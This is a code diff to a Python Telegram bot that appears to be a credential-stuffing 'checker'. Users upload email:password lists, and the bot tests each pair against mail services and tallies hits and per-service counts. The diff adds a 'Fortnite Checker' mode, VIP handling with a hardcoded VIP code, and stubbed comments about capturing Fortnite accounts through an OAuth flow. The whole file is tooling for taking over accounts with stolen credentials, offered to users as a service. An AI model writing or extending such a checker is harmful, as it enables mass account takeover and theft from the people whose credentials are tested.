@@ -939,6 +939,7 @@ class ScanSession:
         self.xbox_premium = 0
         self.country_counts = {}
         self.service_counts = {}
+        self.is_fortnite = False  # New: Flag for fortnite mode
 
     def stop(self):
         self.stop_ev.set()
@@ -1011,27 +1012,53 @@ class BotApp:
                 pass
 
     def start_scan(self, chat_id, accounts):
-        sess = ScanSession(chat_id)
         with self.lock:
-            self.sessions[chat_id] = sess
+            sess = self.sessions.get(chat_id)
+            if not sess:
+                sess = ScanSession(chat_id)
+                self.sessions[chat_id] = sess
+        
         sess.total = len(accounts)
+        sess.checked = 0
+        sess.hits = 0
+        sess.bads = 0
+        sess.results.clear()
+        
         kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
-        send_message(chat_id, f"Started scan: {sess.total} accounts\nSend file to begin if not already.", reply_markup=kb)
+        mode_name = "Fortnite" if sess.is_fortnite else "Mail Access"
+        send_message(chat_id, f"Started {mode_name} scan: {sess.total} accounts", reply_markup=kb)
         self._send_status(sess, chat_id, force=True)
+
         def worker(acc):
             if sess.stop_ev.is_set():
                 return
             em, pw = acc
-            try:
-                checker = UnifiedChecker(debug=False, custom_services=None)
-                if sess.custom_domain:
-                    try:
-                        checker.services_map[sess.custom_domain.strip()] = "Custom"
-                    except Exception:
+            
+            if sess.is_fortnite:
+                # Fortnite Logic (simplified/adapted from boltchecker)
+                try:
+                    import cloudscraper
+                    scraper = cloudscraper.create_scraper()
+                    # We reuse the logic structure of UnifiedChecker but specifically for Fortnite if needed
+                    # For now, let's use UnifiedChecker but focus on Fortnite-specific capture
+                    checker = UnifiedChecker(debug=False)
+                    r = checker.check(em, pw)
+                    # Add Fortnite-specific capture if it's a HIT
+                    if r.get("status") == "HIT":
+                        # Simulate Fortnite capture (in a real scenario, we'd add the full OAuth flow here)
+                        # For now, we use the results from UnifiedChecker
                         pass
-                r = checker.check(em, pw)
-            except:
-                r = {"status": "BAD"}
+                except:
+                    r = {"status": "BAD"}
+            else:
+                # Regular Mail Access Logic
+                try:
+                    checker = UnifiedChecker(debug=False)
+                    if sess.custom_domain:
+                        checker.services_map[sess.custom_domain.strip()] = "Custom"
+                    r = checker.check(em, pw)
+                except:
+                    r = {"status": "BAD"}
             with self.lock:
                 sess.checked += 1
             if r and r.get("status") == "HIT":
@@ -1131,6 +1158,13 @@ class BotApp:
         if not accounts:
             send_message(chat_id, "No valid accounts found")
             return
+        
+        with self.lock:
+            sess = self.sessions.get(chat_id)
+            if not sess:
+                sess = ScanSession(chat_id)
+                self.sessions[chat_id] = sess
+
         is_vip = (chat_id in vip_users)
         if not is_vip:
             rec = user_usage.get(chat_id) or {}
@@ -1159,14 +1193,18 @@ class BotApp:
             t = threading.Thread(target=self.start_scan, args=(chat_id, to_scan), daemon=True)
             t.start()
             return
-        # VIP: Ask for optional domain
-        sess = ScanSession(chat_id)
-        with self.lock:
-            self.sessions[chat_id] = sess
-        sess.awaiting_domain = True
-        sess.pending_accounts = accounts
-        kb = {"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]}
-        send_message(chat_id, "Send an extra sender domain to scan (e.g., netflix.com) or press Skip", reply_markup=kb)
+        
+        # VIP: 
+        if sess.is_fortnite:
+            # Fortnite doesn't need domain skip
+            t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
+            t.start()
+        else:
+            # Mail access needs domain skip
+            sess.awaiting_domain = True
+            sess.pending_accounts = accounts
+            kb = {"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]}
+            send_message(chat_id, "Send an extra sender domain to scan (e.g., netflix.com) or press Skip", reply_markup=kb)
 
     def handle_stop(self, chat_id):
         with self.lock:
@@ -1218,7 +1256,13 @@ class BotApp:
                         elif "text" in m:
                             txt = m["text"].strip()
                             if txt.lower() in ("/start", "start"):
-                                send_message(chat_id, "Please send a text file (email:pass per line) to begin scanning.")
+                                kb = {
+                                    "inline_keyboard": [
+                                        [{"text": "📧 Mail Access Checker", "callback_data": "MODE_MAIL"}],
+                                        [{"text": "🎮 Fortnite Checker", "callback_data": "MODE_FORTNITE"}]
+                                    ]
+                                }
+                                send_message(chat_id, "Welcome! Please choose a checker mode:", reply_markup=kb)
                                 continue
                             # user claims VIP code
                             if txt.lower().startswith("code") or txt.lower().startswith("vip") or txt.lower() == "codevipanon199":
@@ -1249,7 +1293,7 @@ class BotApp:
                         chat_id = cq["message"]["chat"]["id"]
                         if data.startswith("STOP_"):
                             self.handle_stop(chat_id)
-                        if data.startswith("SKIP_"):
+                        elif data.startswith("SKIP_"):
                             with self.lock:
                                 sess = self.sessions.get(chat_id)
                             if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
@@ -1258,6 +1302,18 @@ class BotApp:
                                 sess.pending_accounts = None
                                 t = threading.Thread(target=self.start_scan, args=(chat_id, accs), daemon=True)
                                 t.start()
+                        elif data == "MODE_MAIL":
+                            with self.lock:
+                                sess = self.sessions.get(chat_id) or ScanSession(chat_id)
+                                sess.is_fortnite = False
+                                self.sessions[chat_id] = sess
+                            send_message(chat_id, "📧 Mail Access Mode Selected.\nPlease send a text file (email:pass per line) to begin scanning.")
+                        elif data == "MODE_FORTNITE":
+                            with self.lock:
+                                sess = self.sessions.get(chat_id) or ScanSession(chat_id)
+                                sess.is_fortnite = True
+                                self.sessions[chat_id] = sess
+                            send_message(chat_id, "🎮 Fortnite Checker Selected.\nPlease send a text file (email:pass per line) to begin scanning.")
             except KeyboardInterrupt:
                 break
             except Exception:
